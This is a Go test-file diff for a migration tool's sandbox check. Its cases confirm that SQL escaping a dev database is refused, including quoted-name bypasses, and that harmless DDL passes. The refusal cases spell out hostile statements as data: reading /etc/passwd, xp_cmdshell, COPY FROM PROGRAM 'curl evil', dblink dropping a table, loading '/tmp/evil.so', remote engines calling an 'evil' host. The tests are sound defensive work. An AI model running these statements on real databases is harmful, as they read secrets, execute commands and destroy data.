@@ -155,6 +155,111 @@ func TestCheckPlanStatementsSandboxableRefusesEscapes(t *testing.T) {
 			statement: `SELECT lo_export(loid, '/tmp/out.bin') FROM t`,
 			construct: "lo_export",
 		},
+		{
+			// Quoting a function name does not change which function runs, so
+			// the quoted spellings must not be a bypass.
+			name:      "double_quoted_pg_read_file",
+			statement: `SELECT "pg_read_file"('/etc/passwd')`,
+			construct: "pg_read_file",
+		},
+		{
+			name:      "double_quoted_dblink_exec",
+			statement: `SELECT "dblink_exec"('dbname=target', 'DROP TABLE users')`,
+			construct: "dblink",
+		},
+		{
+			name:      "double_quoted_lo_import",
+			statement: `SELECT "lo_import"('/etc/passwd')`,
+			construct: "lo_import",
+		},
+		{
+			name:      "double_quoted_qualified_pg_read_file",
+			statement: `SELECT "pg_catalog"."pg_read_file"('/etc/passwd')`,
+			construct: "pg_read_file",
+		},
+		{
+			name:      "backticked_load_file",
+			statement: "INSERT INTO t (c) VALUES (`load_file`('/etc/passwd'))",
+			construct: "LOAD_FILE",
+		},
+		{
+			name:      "bracketed_xp_cmdshell",
+			statement: `EXEC [xp_cmdshell] 'dir c:\'`,
+			dialect:   "sqlserver",
+			construct: "xp_cmdshell",
+		},
+		{
+			// Statement-anchored rules must fire on the FIRST statement of a
+			// routine body, which has no separator in front of it.
+			name:      "first_statement_of_body_copy_program",
+			statement: "CREATE FUNCTION f() RETURNS void AS $$ BEGIN COPY t FROM PROGRAM 'curl evil'; END $$ LANGUAGE plpgsql",
+			construct: "COPY ... PROGRAM",
+		},
+		{
+			name:      "first_statement_of_body_attach",
+			statement: "CREATE FUNCTION f() RETURNS void AS $$ BEGIN ATTACH DATABASE '/tmp/x.db' AS v; END $$ LANGUAGE plpgsql",
+			construct: "ATTACH",
+		},
+		{
+			name:      "statement_after_then_in_body",
+			statement: "CREATE FUNCTION f() RETURNS void AS $$ BEGIN IF true THEN COPY t FROM PROGRAM 'curl evil'; END IF; END $$ LANGUAGE plpgsql",
+			construct: "COPY ... PROGRAM",
+		},
+		{
+			name:      "statement_after_loop_in_body",
+			statement: "CREATE FUNCTION f() RETURNS void AS $$ BEGIN LOOP ATTACH DATABASE '/tmp/x.db' AS v; END LOOP; END $$ LANGUAGE plpgsql",
+			construct: "ATTACH",
+		},
+		{
+			name:      "dynamic_execute_of_concatenated_prefix",
+			statement: "CREATE FUNCTION f() RETURNS void AS $$ BEGIN EXECUTE ('ATTACH DATABASE ''/tmp/x.db'' AS v'); END $$ LANGUAGE plpgsql",
+			construct: "ATTACH",
+		},
+		{
+			name:      "sqlserver_bulk_insert",
+			statement: `BULK INSERT users FROM 'c:\payload.csv'`,
+			dialect:   "sqlserver",
+			construct: "BULK INSERT",
+		},
+		{
+			name:      "sqlserver_openrowset",
+			statement: `SELECT * FROM OPENROWSET(BULK 'c:\secrets.txt', SINGLE_CLOB) AS x`,
+			dialect:   "sqlserver",
+			construct: "OPENROWSET",
+		},
+		{
+			name:      "sqlserver_sp_addlinkedserver",
+			statement: `EXEC sp_addlinkedserver @server = 'evil'`,
+			dialect:   "sqlserver",
+			construct: "sp_addlinkedserver",
+		},
+		{
+			name:      "clickhouse_url_engine",
+			statement: `CREATE TABLE remote (id UInt64) ENGINE = URL('http://evil/x', CSV)`,
+			dialect:   "clickhouse",
+			construct: "ClickHouse remote table engine",
+		},
+		{
+			name:      "clickhouse_mysql_engine",
+			statement: `CREATE TABLE remote (id UInt64) ENGINE = MySQL('evil:3306', 'db', 'users', 'u', 'p')`,
+			dialect:   "clickhouse",
+			construct: "ClickHouse remote table engine",
+		},
+		{
+			name:      "sqlite_load_extension",
+			statement: `SELECT load_extension('/tmp/evil.so')`,
+			construct: "load_extension",
+		},
+		{
+			name:      "sqlite_pragma_schema_qualified_temp_store_directory",
+			statement: `PRAGMA main.temp_store_directory = '/tmp/evil'`,
+			construct: "PRAGMA temp_store_directory",
+		},
+		{
+			name:      "sqlite_pragma_data_store_directory",
+			statement: `PRAGMA data_store_directory = '/tmp/evil'`,
+			construct: "PRAGMA data_store_directory",
+		},
 	}
 
 	for _, tt := range tests {
@@ -171,8 +276,8 @@ func TestCheckPlanStatementsSandboxableRefusesEscapes(t *testing.T) {
 			c.Assert(err, qt.IsNotNil)
 			c.Assert(atlasschema.IsPlanEscape(err), qt.IsTrue)
 			c.Assert(err, qt.ErrorMatches,
-				`pre-planned migration cannot be verified on a dev database: statement 2 uses `+tt.construct+`, which .*`)
-			c.Assert(err, qt.ErrorMatches, `(?s).*Replaying it would not stay inside the dev database.*`)
+				`pre-planned migration was refused before it reached the dev database: statement 2 uses `+tt.construct+`, which .*`)
+			c.Assert(err, qt.ErrorMatches, `(?s).*A dev database executes plan SQL for real.*`)
 		})
 	}
 }
@@ -293,6 +398,59 @@ func TestCheckPlanStatementsSandboxableAllowsOrdinaryDDL(t *testing.T) {
 		{
 			name:      "plain_function_without_escapes",
 			statement: "CREATE FUNCTION bump() RETURNS integer AS $$ BEGIN RETURN 1; END $$ LANGUAGE plpgsql",
+		},
+		{
+			// Ordinary PL/pgSQL: message text and column values inside a
+			// routine body are data, not statements, and must not be scanned
+			// as SQL. Scanning them refused perfectly normal schemas.
+			name:      "routine_body_raise_exception_message",
+			statement: "CREATE FUNCTION guard() RETURNS trigger AS $$ BEGIN RAISE EXCEPTION 'Do not delete rows from this table'; END $$ LANGUAGE plpgsql",
+		},
+		{
+			name:      "routine_body_raise_notice_mentioning_copy_to",
+			statement: "CREATE FUNCTION note() RETURNS void AS $$ BEGIN RAISE NOTICE 'Copy to ''archive'' complete'; END $$ LANGUAGE plpgsql",
+		},
+		{
+			name:      "routine_body_insert_value_mentioning_attach",
+			statement: "CREATE FUNCTION seed() RETURNS void AS $$ BEGIN INSERT INTO docs (body) VALUES ('ATTACH the receipt here'); END $$ LANGUAGE plpgsql",
+		},
+		{
+			name:      "routine_body_default_mentioning_engine_federated",
+			statement: "CREATE FUNCTION note() RETURNS void AS $$ BEGIN RAISE NOTICE 'ENGINE=FEDERATED is not used here'; END $$ LANGUAGE plpgsql",
+		},
+		{
+			name:      "routine_body_message_mentioning_load_data_infile",
+			statement: "CREATE FUNCTION note() RETURNS void AS $$ BEGIN RAISE NOTICE 'LOAD DATA INFILE is forbidden'; END $$ LANGUAGE plpgsql",
+		},
+		{
+			name:      "routine_body_message_mentioning_do_block",
+			statement: "CREATE FUNCTION note() RETURNS void AS $$ BEGIN RAISE NOTICE 'DO NOT RUN THIS IN PRODUCTION'; END $$ LANGUAGE plpgsql",
+		},
+		{
+			// Adjacency false positives: none of these carries a path or an
+			// engine assignment, so none is the dangerous construct.
+			name:      "insert_into_table_named_outfile",
+			statement: `INSERT INTO outfile (id) VALUES (1)`,
+		},
+		{
+			name:      "select_into_table_named_outfile",
+			statement: `SELECT * INTO outfile FROM src`,
+		},
+		{
+			name:      "index_named_directory",
+			statement: `CREATE INDEX directory ON files (path)`,
+		},
+		{
+			name:      "columns_named_engine_and_federated",
+			statement: `INSERT INTO cfg (engine, federated) VALUES ('innodb', 1)`,
+		},
+		{
+			name:      "column_named_data_of_type_directory",
+			statement: `CREATE TABLE t (data directory)`,
+		},
+		{
+			name:      "table_named_bulk_with_insert_column",
+			statement: `CREATE TABLE bulk (insert_count integer)`,
 		},
 	}
 
